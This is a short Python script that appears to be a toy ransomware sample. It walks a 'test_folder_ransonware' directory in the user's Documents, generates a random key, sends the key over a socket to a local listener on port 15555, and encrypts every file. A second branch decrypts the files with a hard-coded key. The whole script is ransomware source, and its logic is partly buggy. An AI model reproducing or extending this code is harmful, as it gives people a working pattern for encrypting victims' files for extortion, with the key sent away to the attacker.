import crypto_files, socket, os, random
from os.path import expanduser

hote = "localhost"
port = 15555


dictionnary = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ02133456789'
key_password = ''

desired_path = [expanduser("~") + "\\Documents\\test_folder_ransonware\\"]

number = input("enter a number :")


for path_to_be_enumerated in desired_path:

    for root, dir, files in os.walk(path_to_be_enumerated):
    
        for names in files:
        
            if number == 1:
                for i in range(0, 32):
                    random_letter_dictionnary = random.choice(dictionnary)
                    key_password += random_letter_dictionnary

                socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.connect((hote, port))
                print "Connection on {}".format(port)
                socket.send(key_password)
                print "Close"
                socket.close()
                crypto_files.encrypt_file(key_password, str(os.path.join(root, names)))
               
            elif number == 2:
                input_key = "k8xIohgjpzHJcHCqeKOQPozE9mr5ng6K"
                crypto_files.decrypt_file(input_key,
                             str(os.path.join(root, names.split('.')[0] + ".enc")),
                             str(os.path.join(root, names.split('.')[0])))                
